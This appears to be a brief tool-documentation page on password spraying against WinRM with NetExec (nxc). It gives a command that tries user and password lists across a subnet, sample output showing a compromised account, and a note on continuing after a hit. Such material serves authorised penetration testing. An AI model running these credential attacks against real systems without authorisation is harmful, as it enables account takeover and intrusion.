# Password spraying

### Password spraying (without bruteforce)

```bash
nxc winrm 192.168.1.0/24 -u userfile -p passwordfile --no-bruteforce
```

Expected Results:

```bash
WINRM       192.168.255.131 5985   ROGER            [*] http://192.168.255.131:5985/wsman
WINRM       192.168.255.131 5985   ROGER            [-] GOLD\test1:pass1 "Failed to authenticate the user test1 with ntlm"
WINRM       192.168.255.131 5985   ROGER            [+] GOLD\bonclay:Password@123 (Pwn3d!)
```

{% hint style="info" %}
By default nxc will exit after a successful login is found. Using the `--continue-on-success` flag will continue spraying even after a valid password is found. Usefull for spraying a single password against a large user list.
{% endhint %}
